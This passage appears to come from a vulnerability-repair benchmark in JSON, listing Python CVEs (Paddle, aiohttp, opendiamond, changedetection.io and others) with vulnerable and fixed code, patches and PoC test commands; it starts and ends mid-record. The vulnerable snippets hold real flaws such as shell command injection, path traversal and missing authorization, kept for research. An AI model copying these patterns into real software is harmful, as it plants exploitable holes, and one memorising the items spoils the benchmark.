    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-21354:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/PollBot\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-21354/bin/python -m pytest tests/test_views.py::test_redirects_strip_leading_slashes -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-21354:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/PollBot\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-21354/bin/python -m pytest tests/test_views.py -k \"not test_beta_partner_repacks and \\\nnot test_release_bedrock_release_notes and \\\nnot test_devedition_bedrock_release_notes and \\\nnot test_release_bedrock_esr_release_notes and \\\nnot test_heartbeat and \\\nnot test_version_view_return_200 and \\\nnot test_endpoint_have_got_cache_control_headers\" \\\n-p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-0815",
    "cve_description": "Command injection in paddle.utils.download._wget_download (bypass filter) in paddlepaddle/paddle 2.6.0",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/PaddlePaddle/Paddle",
    "patch_url": [
      "https://github.com/PaddlePaddle/Paddle/commit/4c0888d7b8f10405e2e79adc41c224264f93e816"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_168_1",
        "commit": "22cf91f",
        "file_path": "python/paddle/utils/download.py",
        "start_line": 201,
        "end_line": 228,
        "snippet": "def _wget_download(url: str, fullname: str):\n    try:\n        assert urlparse(url).scheme in (\n            'http',\n            'https',\n        ), 'Only support https and http url'\n        # using wget to download url\n        tmp_fullname = shlex.quote(fullname + \"_tmp\")\n        url = shlex.quote(url)\n        # \\u2013user-agent\n        command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'\n        subprc = subprocess.Popen(\n            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n        )\n        _ = subprc.communicate()\n\n        if subprc.returncode != 0:\n            raise RuntimeError(\n                f'{command} failed. Please make sure `wget` is installed or {url} exists'\n            )\n\n        shutil.move(tmp_fullname, fullname)\n\n    except Exception as e:  # requests.exceptions.ConnectionError\n        logger.info(f\"Downloading {url} failed with exception {str(e)}\")\n        return False\n\n    return fullname"
      },
      {
        "id": "vul_py_168_2",
        "commit": "22cf91f",
        "file_path": "python/paddle/utils/download.py",
        "start_line": 231,
        "end_line": 234,
        "snippet": "_download_methods = {\n    'get': _get_download,\n    'wget': _wget_download,\n}"
      },
      {
        "id": "vul_py_168_3",
        "commit": "22cf91f",
        "file_path": "python/paddle/hapi/hub.py",
        "start_line": 83,
        "end_line": 136,
        "snippet": "def _get_cache_or_reload(repo, force_reload, verbose=True, source='github'):\n    # Setup hub_dir to save downloaded files\n    hub_dir = HUB_DIR\n\n    _make_dirs(hub_dir)\n\n    # Parse github/gitee repo information\n    repo_owner, repo_name, branch = _parse_repo_info(repo, source)\n    # Github allows branch name with slash '/',\n    # this causes confusion with path on both Linux and Windows.\n    # Backslash is not allowed in Github branch name so no need to\n    # to worry about it.\n    normalized_br = branch.replace('/', '_')\n    # Github renames folder repo/v1.x.x to repo-1.x.x\n    # We don't know the repo name before downloading the zip file\n    # and inspect name from it.\n    # To check if cached repo exists, we need to normalize folder names.\n    repo_dir = os.path.join(\n        hub_dir, '_'.join([repo_owner, repo_name, normalized_br])\n    )\n\n    use_cache = (not force_reload) and os.path.exists(repo_dir)\n\n    if use_cache:\n        if verbose:\n            sys.stderr.write(f'Using cache found in {repo_dir}\\n')\n    else:\n        cached_file = os.path.join(hub_dir, normalized_br + '.zip')\n        _remove_if_exists(cached_file)\n\n        url = _git_archive_link(repo_owner, repo_name, branch, source=source)\n\n        fpath = get_path_from_url(\n            url,\n            hub_dir,\n            check_exist=not force_reload,\n            decompress=False,\n            method=('wget' if source == 'gitee' else 'get'),\n        )\n        shutil.move(fpath, cached_file)\n\n        with zipfile.ZipFile(cached_file) as cached_zipfile:\n            extracted_repo_name = cached_zipfile.infolist()[0].filename\n            extracted_repo = os.path.join(hub_dir, extracted_repo_name)\n            _remove_if_exists(extracted_repo)\n            # Unzip the code and rename the base folder\n            cached_zipfile.extractall(hub_dir)\n\n        _remove_if_exists(cached_file)\n        _remove_if_exists(repo_dir)\n        # Rename the repo\n        shutil.move(extracted_repo, repo_dir)\n\n    return repo_dir"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_168_1",
        "commit": "4c0888d7b8f10405e2e79adc41c224264f93e816",
        "file_path": "python/paddle/hapi/hub.py",
        "start_line": 83,
        "end_line": 135,
        "snippet": "def _get_cache_or_reload(repo, force_reload, verbose=True, source='github'):\n    # Setup hub_dir to save downloaded files\n    hub_dir = HUB_DIR\n\n    _make_dirs(hub_dir)\n\n    # Parse github/gitee repo information\n    repo_owner, repo_name, branch = _parse_repo_info(repo, source)\n    # Github allows branch name with slash '/',\n    # this causes confusion with path on both Linux and Windows.\n    # Backslash is not allowed in Github branch name so no need to\n    # to worry about it.\n    normalized_br = branch.replace('/', '_')\n    # Github renames folder repo/v1.x.x to repo-1.x.x\n    # We don't know the repo name before downloading the zip file\n    # and inspect name from it.\n    # To check if cached repo exists, we need to normalize folder names.\n    repo_dir = os.path.join(\n        hub_dir, '_'.join([repo_owner, repo_name, normalized_br])\n    )\n\n    use_cache = (not force_reload) and os.path.exists(repo_dir)\n\n    if use_cache:\n        if verbose:\n            sys.stderr.write(f'Using cache found in {repo_dir}\\n')\n    else:\n        cached_file = os.path.join(hub_dir, normalized_br + '.zip')\n        _remove_if_exists(cached_file)\n\n        url = _git_archive_link(repo_owner, repo_name, branch, source=source)\n\n        fpath = get_path_from_url(\n            url,\n            hub_dir,\n            check_exist=not force_reload,\n            decompress=False,\n        )\n        shutil.move(fpath, cached_file)\n\n        with zipfile.ZipFile(cached_file) as cached_zipfile:\n            extracted_repo_name = cached_zipfile.infolist()[0].filename\n            extracted_repo = os.path.join(hub_dir, extracted_repo_name)\n            _remove_if_exists(extracted_repo)\n            # Unzip the code and rename the base folder\n            cached_zipfile.extractall(hub_dir)\n\n        _remove_if_exists(cached_file)\n        _remove_if_exists(repo_dir)\n        # Rename the repo\n        shutil.move(extracted_repo, repo_dir)\n\n    return repo_dir"
      }
    ],
    "vul_patch": "--- a/python/paddle/utils/download.py\n+++ b/python/paddle/hapi/hub.py\n@@ -1,28 +1,52 @@\n-def _wget_download(url: str, fullname: str):\n-    try:\n-        assert urlparse(url).scheme in (\n-            'http',\n-            'https',\n-        ), 'Only support https and http url'\n-        # using wget to download url\n-        tmp_fullname = shlex.quote(fullname + \"_tmp\")\n-        url = shlex.quote(url)\n-        # \\u2013user-agent\n-        command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'\n-        subprc = subprocess.Popen(\n-            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE\n+def _get_cache_or_reload(repo, force_reload, verbose=True, source='github'):\n+    # Setup hub_dir to save downloaded files\n+    hub_dir = HUB_DIR\n+\n+    _make_dirs(hub_dir)\n+\n+    # Parse github/gitee repo information\n+    repo_owner, repo_name, branch = _parse_repo_info(repo, source)\n+    # Github allows branch name with slash '/',\n+    # this causes confusion with path on both Linux and Windows.\n+    # Backslash is not allowed in Github branch name so no need to\n+    # to worry about it.\n+    normalized_br = branch.replace('/', '_')\n+    # Github renames folder repo/v1.x.x to repo-1.x.x\n+    # We don't know the repo name before downloading the zip file\n+    # and inspect name from it.\n+    # To check if cached repo exists, we need to normalize folder names.\n+    repo_dir = os.path.join(\n+        hub_dir, '_'.join([repo_owner, repo_name, normalized_br])\n+    )\n+\n+    use_cache = (not force_reload) and os.path.exists(repo_dir)\n+\n+    if use_cache:\n+        if verbose:\n+            sys.stderr.write(f'Using cache found in {repo_dir}\\n')\n+    else:\n+        cached_file = os.path.join(hub_dir, normalized_br + '.zip')\n+        _remove_if_exists(cached_file)\n+\n+        url = _git_archive_link(repo_owner, repo_name, branch, source=source)\n+\n+        fpath = get_path_from_url(\n+            url,\n+            hub_dir,\n+            check_exist=not force_reload,\n+            decompress=False,\n+            method=('wget' if source == 'gitee' else 'get'),\n         )\n-        _ = subprc.communicate()\n+        shutil.move(fpath, cached_file)\n \n-        if subprc.returncode != 0:\n-            raise RuntimeError(\n-                f'{command} failed. Please make sure `wget` is installed or {url} exists'\n-            )\n+        with zipfile.ZipFile(cached_file) as cached_zipfile:\n+            extracted_repo_name = cached_zipfile.infolist()[0].filename\n+            extracted_repo = os.path.join(hub_dir, extracted_repo_name)\n+            _remove_if_exists(extracted_repo)\n+            # Unzip the code and rename the base folder\n+            cached_zipfile.extractall(hub_dir)\n \n-        shutil.move(tmp_fullname, fullname)\n-\n-    except Exception as e:  # requests.exceptions.ConnectionError\n-        logger.info(f\"Downloading {url} failed with exception {str(e)}\")\n-        return False\n-\n-    return fullname\n+        _remove_if_exists(cached_file)\n+        _remove_if_exists(repo_dir)\n+        # Rename the repo\n+        shutil.move(extracted_repo, repo_dir)\n\n--- a/python/paddle/utils/download.py\n+++ /dev/null\n@@ -1,4 +0,0 @@\n-_download_methods = {\n-    'get': _get_download,\n-    'wget': _wget_download,\n-}\n\n--- a/python/paddle/hapi/hub.py\n+++ /dev/null\n@@ -1,54 +0,0 @@\n-def _get_cache_or_reload(repo, force_reload, verbose=True, source='github'):\n-    # Setup hub_dir to save downloaded files\n-    hub_dir = HUB_DIR\n-\n-    _make_dirs(hub_dir)\n-\n-    # Parse github/gitee repo information\n-    repo_owner, repo_name, branch = _parse_repo_info(repo, source)\n-    # Github allows branch name with slash '/',\n-    # this causes confusion with path on both Linux and Windows.\n-    # Backslash is not allowed in Github branch name so no need to\n-    # to worry about it.\n-    normalized_br = branch.replace('/', '_')\n-    # Github renames folder repo/v1.x.x to repo-1.x.x\n-    # We don't know the repo name before downloading the zip file\n-    # and inspect name from it.\n-    # To check if cached repo exists, we need to normalize folder names.\n-    repo_dir = os.path.join(\n-        hub_dir, '_'.join([repo_owner, repo_name, normalized_br])\n-    )\n-\n-    use_cache = (not force_reload) and os.path.exists(repo_dir)\n-\n-    if use_cache:\n-        if verbose:\n-            sys.stderr.write(f'Using cache found in {repo_dir}\\n')\n-    else:\n-        cached_file = os.path.join(hub_dir, normalized_br + '.zip')\n-        _remove_if_exists(cached_file)\n-\n-        url = _git_archive_link(repo_owner, repo_name, branch, source=source)\n-\n-        fpath = get_path_from_url(\n-            url,\n-            hub_dir,\n-            check_exist=not force_reload,\n-            decompress=False,\n-            method=('wget' if source == 'gitee' else 'get'),\n-        )\n-        shutil.move(fpath, cached_file)\n-\n-        with zipfile.ZipFile(cached_file) as cached_zipfile:\n-            extracted_repo_name = cached_zipfile.infolist()[0].filename\n-            extracted_repo = os.path.join(hub_dir, extracted_repo_name)\n-            _remove_if_exists(extracted_repo)\n-            # Unzip the code and rename the base folder\n-            cached_zipfile.extractall(hub_dir)\n-\n-        _remove_if_exists(cached_file)\n-        _remove_if_exists(repo_dir)\n-        # Rename the repo\n-        shutil.move(extracted_repo, repo_dir)\n-\n-    return repo_dir\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-6596",
    "cve_description": "webhooks/base.py in Anymail (aka django-anymail) before 1.2.1 is prone to a timing attack vulnerability on the WEBHOOK_AUTHORIZATION secret, which allows remote attackers to post arbitrary e-mail tracking events.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/anymail/django-anymail",
    "patch_url": [
      "https://github.com/anymail/django-anymail/commit/c07998304b4a31df4c61deddcb03d3607a04691b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_370_1",
        "commit": "7029298b930620b1655dab2548f72d6640a5905e",
        "file_path": "anymail/webhooks/base.py",
        "start_line": 41,
        "end_line": 48,
        "snippet": "    def validate_request(self, request):\n        \"\"\"If configured for webhook basic auth, validate request has correct auth.\"\"\"\n        if self.basic_auth:\n            basic_auth = get_request_basic_auth(request)\n            if basic_auth is None or basic_auth not in self.basic_auth:\n                # noinspection PyUnresolvedReferences\n                raise AnymailWebhookValidationFailure(\n                    \"Missing or invalid basic auth in Anymail %s webhook\" % self.esp_name)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_370_1",
        "commit": "c07998304b4a31df4c61deddcb03d3607a04691b",
        "file_path": "anymail/webhooks/base.py",
        "start_line": 42,
        "end_line": 54,
        "snippet": "    def validate_request(self, request):\n        \"\"\"If configured for webhook basic auth, validate request has correct auth.\"\"\"\n        if self.basic_auth:\n            request_auth = get_request_basic_auth(request)\n            # Use constant_time_compare to avoid timing attack on basic auth. (It's OK that any()\n            # can terminate early: we're not trying to protect how many auth strings are allowed,\n            # just the contents of each individual auth string.)\n            auth_ok = any(constant_time_compare(request_auth, allowed_auth)\n                          for allowed_auth in self.basic_auth)\n            if not auth_ok:\n                # noinspection PyUnresolvedReferences\n                raise AnymailWebhookValidationFailure(\n                    \"Missing or invalid basic auth in Anymail %s webhook\" % self.esp_name)"
      }
    ],
    "vul_patch": "--- a/anymail/webhooks/base.py\n+++ b/anymail/webhooks/base.py\n@@ -1,8 +1,13 @@\n     def validate_request(self, request):\n         \"\"\"If configured for webhook basic auth, validate request has correct auth.\"\"\"\n         if self.basic_auth:\n-            basic_auth = get_request_basic_auth(request)\n-            if basic_auth is None or basic_auth not in self.basic_auth:\n+            request_auth = get_request_basic_auth(request)\n+            # Use constant_time_compare to avoid timing attack on basic auth. (It's OK that any()\n+            # can terminate early: we're not trying to protect how many auth strings are allowed,\n+            # just the contents of each individual auth string.)\n+            auth_ok = any(constant_time_compare(request_auth, allowed_auth)\n+                          for allowed_auth in self.basic_auth)\n+            if not auth_ok:\n                 # noinspection PyUnresolvedReferences\n                 raise AnymailWebhookValidationFailure(\n                     \"Missing or invalid basic auth in Anymail %s webhook\" % self.esp_name)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31506",
    "cve_description": "The cmusatyalab/opendiamond repository through 10.1.1 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/cmusatyalab/opendiamond",
    "patch_url": [
      "https://github.com/cmusatyalab/opendiamond/commit/398049c187ee644beabab44d6fece82251c1ea56"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_22_1",
        "commit": "d2f20ffff793f88335f2c0244679d7193295abe2",
        "file_path": "opendiamond/dataretriever/diamond_store.py",
        "start_line": 122,
        "end_line": 123,
        "snippet": "def _get_obj_absolute_path(obj_path):\n    return os.path.join(DATAROOT, obj_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_22_1",
        "commit": "398049c187ee644beabab44d6fece82251c1ea56",
        "file_path": "opendiamond/dataretriever/diamond_store.py",
        "start_line": 123,
        "end_line": 124,
        "snippet": "def _get_obj_absolute_path(obj_path):\n    return safe_join(DATAROOT, obj_path)"
      }
    ],
    "vul_patch": "--- a/opendiamond/dataretriever/diamond_store.py\n+++ b/opendiamond/dataretriever/diamond_store.py\n@@ -1,2 +1,2 @@\n def _get_obj_absolute_path(obj_path):\n-    return os.path.join(DATAROOT, obj_path)\n+    return safe_join(DATAROOT, obj_path)\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-31506:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/opendiamond\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-31506/bin/python  hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-31506:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/opendiamond\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-31506/bin/python -m pytest -v tests/ --deselect=tests/test_client.py --deselect=tests/test_bundle.py --deselect=tests/test_attributes.py::test_rgbimage_attr --deselect=tests/test_attributes.py::test_string_attr --deselect=tests/test_attributes.py::test_integer_attr --deselect=tests/test_attributes.py::test_float_attr --deselect=tests/test_attributes.py::test_patches_attr --deselect=tests/test_blobcache.py::test_blobcache_add --deselect=tests/test_blobcache.py::test_blobcache_contains --deselect=tests/test_blobcache.py::test_blobcache_prune --deselect=tests/test_blobcache.py::test_blobcache_gc_rescue --deselect=tests/test_blobcache.py::test_executable_blobcache\n"
  },
  {
    "cve_id": "CVE-2024-23329",
    "cve_description": " changedetection.io is an open source tool designed to monitor websites for content changes. In affected versions the API endpoint `/api/v1/watch/<uuid>/history` can be accessed by any unauthorized user. As a result any unauthorized user can check one's watch history. However, because unauthorized party first needs to know a watch UUID, and the watch history endpoint itself returns only paths to the snapshot on the server, an impact on users' data privacy is minimal. This issue has been addressed in version 0.45.13. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/dgtlmoon/changedetection.io",
    "patch_url": [
      "https://github.com/dgtlmoon/changedetection.io/commit/402f1e47e78ecd155b1e90f30cce424ff7763e0f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_118_1",
        "commit": "9510345",
        "file_path": "changedetectionio/api/api_v1.py",
        "start_line": 136,
        "end_line": 155,
        "snippet": "    def get(self, uuid):\n        \"\"\"\n        @api {get} /api/v1/watch/<string:uuid>/history Get a list of all historical snapshots available for a watch\n        @apiDescription Requires `uuid`, returns list\n        @apiExample {curl} Example usage:\n            curl http://localhost:5000/api/v1/watch/cc0cfffa-f449-477b-83ea-0caafd1dc091/history -H\"x-api-key:813031b16330fe25e3780cf0325daa45\" -H \"Content-Type: application/json\"\n            {\n                \"1676649279\": \"/tmp/data/6a4b7d5c-fee4-4616-9f43-4ac97046b595/cb7e9be8258368262246910e6a2a4c30.txt\",\n                \"1677092785\": \"/tmp/data/6a4b7d5c-fee4-4616-9f43-4ac97046b595/e20db368d6fc633e34f559ff67bb4044.txt\",\n                \"1677103794\": \"/tmp/data/6a4b7d5c-fee4-4616-9f43-4ac97046b595/02efdd37dacdae96554a8cc85dc9c945.txt\"\n            }\n        @apiName Get list of available stored snapshots for watch\n        @apiGroup Watch History\n        @apiSuccess (200) {String} OK\n        @apiSuccess (404) {String} ERR Not found\n        \"\"\"\n        watch = self.datastore.data['watching'].get(uuid)\n        if not watch:\n            abort(404, message='No watch exists with the UUID of {}'.format(uuid))\n        return watch.history, 200"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_118_1",
        "commit": "402f1e4",
        "file_path": "changedetectionio/api/api_v1.py",
        "start_line": 136,
        "end_line": 156,
        "snippet": "    @auth.check_token\n    def get(self, uuid):\n        \"\"\"\n        @api {get} /api/v1/watch/<string:uuid>/history Get a list of all historical snapshots available for a watch\n        @apiDescription Requires `uuid`, returns list\n        @apiExample {curl} Example usage:\n            curl http://localhost:5000/api/v1/watch/cc0cfffa-f449-477b-83ea-0caafd1dc091/history -H\"x-api-key:813031b16330fe25e3780cf0325daa45\" -H \"Content-Type: application/json\"\n            {\n                \"1676649279\": \"/tmp/data/6a4b7d5c-fee4-4616-9f43-4ac97046b595/cb7e9be8258368262246910e6a2a4c30.txt\",\n                \"1677092785\": \"/tmp/data/6a4b7d5c-fee4-4616-9f43-4ac97046b595/e20db368d6fc633e34f559ff67bb4044.txt\",\n                \"1677103794\": \"/tmp/data/6a4b7d5c-fee4-4616-9f43-4ac97046b595/02efdd37dacdae96554a8cc85dc9c945.txt\"\n            }\n        @apiName Get list of available stored snapshots for watch\n        @apiGroup Watch History\n        @apiSuccess (200) {String} OK\n        @apiSuccess (404) {String} ERR Not found\n        \"\"\"\n        watch = self.datastore.data['watching'].get(uuid)\n        if not watch:\n            abort(404, message='No watch exists with the UUID of {}'.format(uuid))\n        return watch.history, 200"
      }
    ],
    "vul_patch": "--- a/changedetectionio/api/api_v1.py\n+++ b/changedetectionio/api/api_v1.py\n@@ -1,3 +1,4 @@\n+    @auth.check_token\n     def get(self, uuid):\n         \"\"\"\n         @api {get} /api/v1/watch/<string:uuid>/history Get a list of all historical snapshots available for a watch\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-15235",
    "cve_description": "In RACTF before commit f3dc89b, unauthenticated users are able to get the value of sensitive config keys that would normally be hidden to everyone except admins. All versions after commit f3dc89b9f6ab1544a289b3efc06699b13d63e0bd(3/10/20) are patched.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/ractf/core",
    "patch_url": [
      "https://github.com/ractf/core/commit/f3dc89b9f6ab1544a289b3efc06699b13d63e0bd"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_262_1",
        "commit": "41edf92",
        "file_path": "src/config/views.py",
        "start_line": 13,
        "end_line": 18,
        "snippet": "    def get(self, request, name=None):\n        if name is None:\n            if request.user.is_staff:\n                return FormattedResponse(config.get_all())\n            return FormattedResponse(config.get_all_non_sensitive())\n        return FormattedResponse(config.get(name))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_262_2",
        "commit": "f3dc89b",
        "file_path": "src/config/config.py",
        "start_line": 67,
        "end_line": 68,
        "snippet": "def is_sensitive(key):\n    return key in backend.get('sensitive_fields')"
      },
      {
        "id": "fix_py_262_1",
        "commit": "f3dc89b",
        "file_path": "src/config/views.py",
        "start_line": 13,
        "end_line": 20,
        "snippet": "    def get(self, request, name=None):\n        if name is None:\n            if request.user.is_superuser:\n                return FormattedResponse(config.get_all())\n            return FormattedResponse(config.get_all_non_sensitive())\n        if not config.is_sensitive(name) or request.is_superuser:\n            return FormattedResponse(config.get(name))\n        return FormattedResponse(status=HTTP_403_FORBIDDEN)"
      }
    ],
    "vul_patch": "--- a/src/config/views.py\n+++ b/src/config/views.py\n@@ -1,6 +1,8 @@\n     def get(self, request, name=None):\n         if name is None:\n-            if request.user.is_staff:\n+            if request.user.is_superuser:\n                 return FormattedResponse(config.get_all())\n             return FormattedResponse(config.get_all_non_sensitive())\n-        return FormattedResponse(config.get(name))\n+        if not config.is_sensitive(name) or request.is_superuser:\n+            return FormattedResponse(config.get(name))\n+        return FormattedResponse(status=HTTP_403_FORBIDDEN)\n\n--- /dev/null\n+++ b/src/config/views.py\n@@ -0,0 +1,2 @@\n+def is_sensitive(key):\n+    return key in backend.get('sensitive_fields')\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-23334",
    "cve_description": "aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option 'follow_symlinks' can be used to determine whether to follow symbolic links outside the static root directory. When 'follow_symlinks' is set to True, there is no validation to check if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.  Disabling follow_symlinks and using a reverse proxy are encouraged mitigations.  Version 3.9.2 fixes this issue.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/aio-libs/aiohttp",
    "patch_url": [
      "https://github.com/aio-libs/aiohttp/commit/1c335944d6a8b1298baf179b7c0b3069f10c514b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_17_1",
        "commit": "33ccdfb0a12690af5bb49bda2319ec0907fa7827",
        "file_path": "aiohttp/web_urldispatcher.py",
        "start_line": 558,
        "end_line": 592,
        "snippet": "    def url_for(  # type: ignore[override]\n        self,\n        *,\n        filename: PathLike,\n        append_version: Optional[bool] = None,\n    ) -> URL:\n        if append_version is None:\n            append_version = self._append_version\n        filename = str(filename).lstrip(\"/\")\n\n        url = URL.build(path=self._prefix, encoded=True)\n        # filename is not encoded\n        if YARL_VERSION < (1, 6):\n            url = url / filename.replace(\"%\", \"%25\")\n        else:\n            url = url / filename\n\n        if append_version:\n            try:\n                filepath = self._directory.joinpath(filename).resolve()\n                if not self._follow_symlinks:\n                    filepath.relative_to(self._directory)\n            except (ValueError, FileNotFoundError):\n                # ValueError for case when path point to symlink\n                # with follow_symlinks is False\n                return url  # relatively safe\n            if filepath.is_file():\n                # TODO cache file content\n                # with file watcher for cache invalidation\n                with filepath.open(\"rb\") as f:\n                    file_bytes = f.read()\n                h = self._get_file_hash(file_bytes)\n                url = url.with_query({self.VERSION_KEY: h})\n                return url\n        return url"
      },
      {
        "id": "vul_py_17_2",
        "commit": "33ccdfb0a12690af5bb49bda2319ec0907fa7827",
        "file_path": "aiohttp/web_urldispatcher.py",
        "start_line": 634,
        "end_line": 670,
        "snippet": "    async def _handle(self, request: Request) -> StreamResponse:\n        rel_url = request.match_info[\"filename\"]\n        try:\n            filename = Path(rel_url)\n            if filename.anchor:\n                # rel_url is an absolute name like\n                # /static/\\\\machine_name\\c$ or /static/D:\\path\n                # where the static dir is totally different\n                raise HTTPForbidden()\n            filepath = self._directory.joinpath(filename).resolve()\n            if not self._follow_symlinks:\n                filepath.relative_to(self._directory)\n        except (ValueError, FileNotFoundError) as error:\n            # relatively safe\n            raise HTTPNotFound() from error\n        except HTTPForbidden:\n            raise\n        except Exception as error:\n            # perm error or other kind!\n            request.app.logger.exception(error)\n            raise HTTPNotFound() from error\n\n        # on opening a dir, load its contents if allowed\n        if filepath.is_dir():\n            if self._show_index:\n                try:\n                    return Response(\n                        text=self._directory_as_html(filepath), content_type=\"text/html\"\n                    )\n                except PermissionError:\n                    raise HTTPForbidden()\n            else:\n                raise HTTPForbidden()\n        elif filepath.is_file():\n            return FileResponse(filepath, chunk_size=self._chunk_size)\n        else:\n            raise HTTPNotFound"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_17_1",
        "commit": "1c335944d6a8b1298baf179b7c0b3069f10c514b",
        "file_path": "aiohttp/web_urldispatcher.py",
        "start_line": 558,
        "end_line": 597,
        "snippet": "    def url_for(  # type: ignore[override]\n        self,\n        *,\n        filename: PathLike,\n        append_version: Optional[bool] = None,\n    ) -> URL:\n        if append_version is None:\n            append_version = self._append_version\n        filename = str(filename).lstrip(\"/\")\n\n        url = URL.build(path=self._prefix, encoded=True)\n        # filename is not encoded\n        if YARL_VERSION < (1, 6):\n            url = url / filename.replace(\"%\", \"%25\")\n        else:\n            url = url / filename\n\n        if append_version:\n            unresolved_path = self._directory.joinpath(filename)\n            try:\n                if self._follow_symlinks:\n                    normalized_path = Path(os.path.normpath(unresolved_path))\n                    normalized_path.relative_to(self._directory)\n                    filepath = normalized_path.resolve()\n                else:\n                    filepath = unresolved_path.resolve()\n                    filepath.relative_to(self._directory)\n            except (ValueError, FileNotFoundError):\n                # ValueError for case when path point to symlink\n                # with follow_symlinks is False\n                return url  # relatively safe\n            if filepath.is_file():\n                # TODO cache file content\n                # with file watcher for cache invalidation\n                with filepath.open(\"rb\") as f:\n                    file_bytes = f.read()\n                h = self._get_file_hash(file_bytes)\n                url = url.with_query({self.VERSION_KEY: h})\n                return url\n        return url"
      },
      {
        "id": "fix_py_17_2",
        "commit": "1c335944d6a8b1298baf179b7c0b3069f10c514b",
        "file_path": "aiohttp/web_urldispatcher.py",
        "start_line": 639,
        "end_line": 680,
